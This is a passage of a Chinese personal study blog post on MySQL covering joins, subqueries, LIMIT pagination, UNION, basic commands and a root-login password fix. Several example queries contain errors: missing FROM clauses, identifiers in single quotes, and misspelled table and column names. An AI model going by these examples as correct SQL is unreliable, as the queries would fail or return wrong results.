分组</p>\n<p>​            having 筛选条件</p>\n<p>​            order by 排序条件</p>\n</li>\n</ul>\n<h6 id=\"内链接\"><a href=\"#内链接\" class=\"headerlink\" title=\"内链接\"></a>内链接</h6><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表1 别名</span><br><span class=\"line\">inner join 表2 别名</span><br><span class=\"line\">on 连接条件；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>分类：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内链接：inner</span><br><span class=\"line\">外链接</span><br><span class=\"line\">\t左外：left【outer】  //括号中outer可以省去</span><br><span class=\"line\">\t右外：right 【outer】</span><br><span class=\"line\">\t全外：full 【outer</span><br><span class=\"line\">交叉连接：cross</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li>等值查询（内连接）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例1 查询员工名、部门名</span><br><span class=\"line\">select last_name, department_name</span><br><span class=\"line\">from employees e</span><br><span class=\"line\">inner join departments d</span><br><span class=\"line\">on e.&#x27;department_id&#x27; = d.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>非等值连接(内链接)</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例1：查询员工的工资级别</span><br><span class=\"line\">select salary, grdae_level</span><br><span class=\"line\">from employees e</span><br><span class=\"line\">join job_grades g</span><br><span class=\"line\">on e.&#x27;salary&#x27; between g.&#x27;lowest_sal&#x27; and &#x27;highest_sal&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>自连接（内连接）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询员工的名字，上级的名字,包含字符k的</span><br><span class=\"line\">select e.last_name, m.last_name</span><br><span class=\"line\">join employees m</span><br><span class=\"line\">on e.&#x27;manager_id&#x27; = m.&#x27;employee_id&#x27;</span><br><span class=\"line\">where e.&#x27;last_name&#x27; like &#x27;%k%&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h6 id=\"外连接\"><a href=\"#外连接\" class=\"headerlink\" title=\"外连接\"></a>外连接</h6><ul>\n<li>应用场景，一个表格有，一个表格没有</li>\n<li>特点：</li>\n</ul>\n<ol>\n<li><p>外连接的查询结果为主表中的所有记录</p>\n<p>如果从表中有和他匹配的，则显示匹配值</p>\n<p>如果从表中没有和它匹配的值，则显示null</p>\n<p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p>\n</li>\n<li><p>左外连接，left join左边的是主表</p>\n<p>右外连接，right join右边的是主表</p>\n<p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p>\n</li>\n</ol>\n<ul>\n<li><p>主表：查询内容较多的表格</p>\n</li>\n<li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p>\n</li>\n</ul>\n<h6 id=\"交叉连接\"><a href=\"#交叉连接\" class=\"headerlink\" title=\"交叉连接\"></a>交叉连接</h6><ul>\n<li>相当于用99语法实现的笛卡尔乘积</li>\n</ul>\n<p>图示：</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjOQf.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjOQf.png\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjXy8.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjXy8.png\"></p>\n<h4 id=\"6、子查询\"><a href=\"#6、子查询\" class=\"headerlink\" title=\"6、子查询\"></a>6、子查询</h4><ol>\n<li>含义：出现在其他语句中的select语句，称为子查询或内查询</li>\n<li>分类：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">按子查询出现的位置：</span><br><span class=\"line\">\t\tselect后面：</span><br><span class=\"line\">\t\t\t仅仅支持标量子查询</span><br><span class=\"line\">\t\tfrom后面：</span><br><span class=\"line\">\t\t\t支持表子查询</span><br><span class=\"line\">\t\twhere或having后面： // 重点</span><br><span class=\"line\">\t\t\t标量子查询\t   //  重点</span><br><span class=\"line\">\t\t\t列子查询\t\t// 重点</span><br><span class=\"line\">\t\t\t行子查询\t\t// 重点</span><br><span class=\"line\">\t\texists后面（相关子查询）</span><br><span class=\"line\">\t\t\t表子查询</span><br><span class=\"line\">按结果集的行列数不同：</span><br><span class=\"line\">\t\t标量子查询：结果集只有一行一列</span><br><span class=\"line\">\t\t列子查询：结果集有一列多行</span><br><span class=\"line\">\t\t行子查询：结果集有一行多列</span><br><span class=\"line\">\t\t表子查询：结果集有多行多列</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（一）where或having后面</li>\n</ul>\n<ol>\n<li><p>标量子查询（单行子查询）</p>\n</li>\n<li><p>列子查询（多行子查询）</p>\n</li>\n<li><p>行子查询（多行多列）</p>\n</li>\n<li><p>特点：（1）子查询放在小括号内</p>\n<p>​           （2）子查询一般放在条件的右侧</p>\n<p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p>\n<p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p>\n<p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p>\n</li>\n<li><p>标量子查询</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：谁的工资比sam高？</span><br><span class=\"line\">#查询sam的工资</span><br><span class=\"line\">select salary</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where last_name = &#x27;sam&#x27;；</span><br><span class=\"line\"></span><br><span class=\"line\">#查询员工的信息，满足salary &gt; sam工资 的结果</span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where salary &gt;(</span><br><span class=\"line\">    select salary</span><br><span class=\"line\">    from employees      //为更清晰的表达，子查询最好进行缩进</span><br><span class=\"line\">    where last_name = &#x27;sam&#x27;  </span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：返回公司工资最少的员工的last_name,job_id,salary</span><br><span class=\"line\">#查询公司的最低工资</span><br><span class=\"line\">select min(salary)</span><br><span class=\"line\">from empolyees;</span><br><span class=\"line\"></span><br><span class=\"line\">#查询last_name, job_id, salary, 要求salary= 公司的最低工资</span><br><span class=\"line\">select last_name, job_id, salary</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where salary=(</span><br><span class=\"line\">    select min(salary)</span><br><span class=\"line\">    from empolyees</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>列子查询(多行子查询）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：返回location_id是1400或1700的部门中的所有员工姓名</span><br><span class=\"line\">#查询location_id是1700或1400的部门编号</span><br><span class=\"line\">select department_id</span><br><span class=\"line\">from departments</span><br><span class=\"line\">where location_id in(1400, 1700);</span><br><span class=\"line\"></span><br><span class=\"line\">#查询员工姓名，要求部门号是上个查询结果中的某一个</span><br><span class=\"line\">select employees</span><br><span class=\"line\">where department_id in(</span><br><span class=\"line\">    select department_id</span><br><span class=\"line\">    from departments</span><br><span class=\"line\">    where location_id in(1400, 1700)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li><p>行子查询（多行多列）</p>\n<p>略</p>\n</li>\n</ol>\n<ul>\n<li>（二）放在select后面的标量子查询</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询每个部门的员工个数</span><br><span class=\"line\">select d.*, (</span><br><span class=\"line\">\tselect count(*)</span><br><span class=\"line\">\tfrom empolyees e</span><br><span class=\"line\">\twhere e.department_id = d.&#x27;department_id&#x27;</span><br><span class=\"line\">) 个数</span><br><span class=\"line\">from departments d;</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（三）放在from后面<ul>\n<li>将子查询结果当成一张表，要求必须起别名</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询每个部门的平均工资的平均等级</span><br><span class=\"line\">#查询每个部门的平均工资</span><br><span class=\"line\">select avg(salary), department_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by department_id</span><br><span class=\"line\"></span><br><span class=\"line\">#连接上个查询结果集和job_grades表，筛选条件平均工资</span><br><span class=\"line\">select ag_dep.*, g.&#x27;grade_level&#x27;</span><br><span class=\"line\">from(</span><br><span class=\"line\">\tselect avg(salary), department_id</span><br><span class=\"line\">\tfrom employees</span><br><span class=\"line\">\tgroup by department_id</span><br><span class=\"line\">) ag_dep</span><br><span class=\"line\">inner join job_grades g</span><br><span class=\"line\">on ag_dep.ag between lowest_sal and highest_sal;</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>（四）放在exists后面（相关子查询）<ul>\n<li>能用exists的都能用in代替</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">\texists 完整的查询语句</span><br><span class=\"line\">结果：0或1   //返回一个布尔值</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询员工的部门名</span><br><span class=\"line\">select department_name</span><br><span class=\"line\">from departments d</span><br><span class=\"line\">where exists(</span><br><span class=\"line\">\tselect *</span><br><span class=\"line\">\tfrom employees e</span><br><span class=\"line\">\twhere d.&#x27;department_id&#x27;=e.&#x27;depaertment_id&#x27;</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"7、分页查询\"><a href=\"#7、分页查询\" class=\"headerlink\" title=\"7、分页查询\"></a>7、分页查询</h4><ol>\n<li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表</span><br><span class=\"line\">连接类型 join 表2</span><br><span class=\"line\">on 连接条件</span><br><span class=\"line\">where 筛选条件</span><br><span class=\"line\">group by 分组字段</span><br><span class=\"line\">having 分组后的筛选</span><br><span class=\"line\">order by 排序的字段</span><br><span class=\"line\">limit offset, size;</span><br><span class=\"line\"></span><br><span class=\"line\">offset要显示条目的起始索引（起始索引从0开始）</span><br><span class=\"line\">size 要显示的条目个数</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>案例：查询前五条员工信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from employees limit 0, 5;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>案例2：查询11条—第25条</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from employees limit 10, 15;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where commission_pic is not null</span><br><span class=\"line\">order by salsry desc</span><br><span class=\"line\">limit 10;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>limit语句放在查询语句德尔最后</li>\n<li>公式：要显示的页数page，每页的条目数size</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表</span><br><span class=\"line\">limit (page-1)*size, size;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"8、联合查询\"><a href=\"#8、联合查询\" class=\"headerlink\" title=\"8、联合查询\"></a>8、联合查询</h4><ol>\n<li>union联合 ：将多个查询语句的结果合并成一个结果</li>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询语句1</span><br><span class=\"line\">union</span><br><span class=\"line\">查询语句2</span><br><span class=\"line\">union</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email like &#x27;%a%&#x27; or deaprtment_id&gt;90;</span><br><span class=\"line\"></span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email like &#x27;%a%&#x27;</span><br><span class=\"line\">union</span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where deparment_id&gt;90;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>要求多条查询语句的查询列数是一致的</li>\n<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>\n<li>union关键字默认去重，如果使用union all 可以包含重复选项</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"数据库的学习（一）\"><a href=\"#数据库的学习（一）\" class=\"headerlink\" title=\"数据库的学习（一）\"></a>数据库的学习（一）</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=28\">相关视频链接</a></li>\n</ul>\n<h2 id=\"数据库及其概念\"><a href=\"#数据库及其概念\" class=\"headerlink\" title=\"数据库及其概念\"></a>数据库及其概念</h2><ul>\n<li>DB 数据库</li>\n<li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li>\n<li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li>\n<li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li>\n</ul>","more":"<h3 id=\"数据库管理的特点\"><a href=\"#数据库管理的特点\" class=\"headerlink\" title=\"数据库管理的特点\"></a>数据库管理的特点</h3><ol>\n<li>先将数据放到 “一张表” 中， 在将表放到仓库中</li>\n<li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li>\n<li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li>\n<li>表是由列组成，也称为字段，相当与python中的  “属性”</li>\n<li>表是按行储存的，每一行相当与python中的  ”对象“</li>\n</ol>\n<ul>\n<li>端口号port 3306</li>\n</ul>\n<h3 id=\"Linux-系统-Mysql-相关事项\"><a href=\"#Linux-系统-Mysql-相关事项\" class=\"headerlink\" title=\"Linux 系统 Mysql 相关事项\"></a>Linux 系统 Mysql 相关事项</h3><ul>\n<li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p>\n</li>\n<li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p>\n</li>\n<li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href=\"https://blog.csdn.net/qq_31083947/article/details/90248565\">相关检查操作链接</a></p>\n</li>\n</ul>\n<h3 id=\"数据库常用命令\"><a href=\"#数据库常用命令\" class=\"headerlink\" title=\"数据库常用命令\"></a>数据库常用命令</h3><ol>\n<li>进入管理系统时时查看有那些数据库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show databases;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>进入库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use 库的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看库里有哪些表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show tables;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>从现在所在的库中查看别的库中存有的表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show tables from 库的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>查看现在在哪个库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select database();</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>查看表的内容</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">desc 表的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>创建表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table 表名（</span><br><span class=\"line\">\t列名 列类型，</span><br><span class=\"line\">\t列名 列类型，</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"SQL语法规范\"><a href=\"#SQL语法规范\" class=\"headerlink\" title=\"SQL语法规范\"></a>SQL语法规范</h3><ol>\n<li>不区分大小写，但建议关键字大写，表名，列名小写</li>\n<li>每行命令u最好用分号结尾</li>\n<li>每行命令根据需要，可以进行缩进，或换行</li>\n<li>SQL语法中索引从1开始</li>\n<li>注释 </li>\n</ol>\n<ul>\n<li>单行注释：#注释文字</li>\n<li>单行注释：– 注释文字（注意横杠后面有空格）</li>\n<li>多行注释：/× 注释文字 ×/</li>\n</ul>\n<h3 id=\"使用-DBMS-图形化界面以及命令行登录时出现错误解决\"><a href=\"#使用-DBMS-图形化界面以及命令行登录时出现错误解决\" class=\"headerlink\" title=\"使用 DBMS 图形化界面以及命令行登录时出现错误解决\"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul>\n<li><a href=\"https://www.cnblogs.com/leolztang/p/5094930.html\">原文链接</a></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~$ mysql -u root -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">ERROR 1698 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>解决</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 强制登录</span><br><span class=\"line\">sudo mysql</span><br><span class=\"line\"></span><br><span class=\"line\">select user, plugin from mysql.user;</span><br><span class=\"line\"></span><br><span class=\"line\">update mysql.user set authentication_string=PASSWORD(&#x27;hero1314&#x27;), plugin=&#x27;mysql_native_password&#x27; where user=&#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">flush privileges;</span><br><span class=\"line\"></span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"数据库语言的学习\"><a href=\"#数据库语言的学习\" class=\"headerlink\" title=\"数据库语言的学习\"></a>数据库语言的学习</h2><h3 id=\"DQL语言的学习\"><a href=\"#DQL语言的学习\" class=\"headerlink\" title=\"DQL语言的学习\"></a>DQL语言的学习</h3><h4 id=\"1、基础查询\"><a href=\"#1、基础查询\" class=\"headerlink\" title=\"1、基础查询\"></a>1、基础查询</h4><ul>\n<li>语法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表 from 表名;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>特点：</li>\n</ul>\n<ol>\n<li>查询列表可以是：表中的字段，常量值，表达式，函数</li>\n<li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li>\n</ol>\n<ul>\n<li>查询字段</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段一，字段二 from 表格;    //字段之间用逗号隔开</span><br><span class=\"line\">select * from 表格;  // 查询所有字段</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>着重号 `  （1的旁边的那个），用来标识字段</p>\n</li>\n<li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p>\n</li>\n<li><p>起别名</p>\n<p>​    别名有空格时，应用空格将别名括起来</p>\n<p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段值 as 别名;  // as可以省略</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>去重：在被查询的字段之前加上关键字 distinct</li>\n<li>+ 号的作用</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 100+90; // 俩个操作数都为数值型，则做加法运算</span><br><span class=\"line\"># 结果：190</span><br><span class=\"line\">select &#x27;100&#x27;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算</span><br><span class=\"line\"># 结果：190</span><br><span class=\"line\">select null+10; //若有一个方为null，则结果肯定为null</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>ifnull( ) 函数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"2、条件查询\"><a href=\"#2、条件查询\" class=\"headerlink\" title=\"2、条件查询\"></a>2、条件查询</h4><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表 from 表名 where 筛选条件;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>分类：</li>\n</ul>\n<ol>\n<li><p>按表达条件筛选：</p>\n<p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p>\n<p>​        注意：&lt;&gt;为不等于的意思</p>\n</li>\n<li><p>按逻辑表达式筛选：</p>\n<p>​        &amp;&amp;， ||， ！</p>\n<p>​        and，or，not   // SQL推荐使用</p>\n</li>\n<li><p>模糊查询</p>\n<p>​        like, between and, in, is null</p>\n<ul>\n<li>between and 等价与  &gt;=  and &lt;=</li>\n</ul>\n<p>模糊查询通常与通配符一起使用  (in 不支持)</p>\n<ul>\n<li><p>常见通配符：% 匹配任意一个或零个</p>\n<p>​                     _  (下划线) 匹配任意一个</p>\n<ul>\n<li>支持对通配符进行转义</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 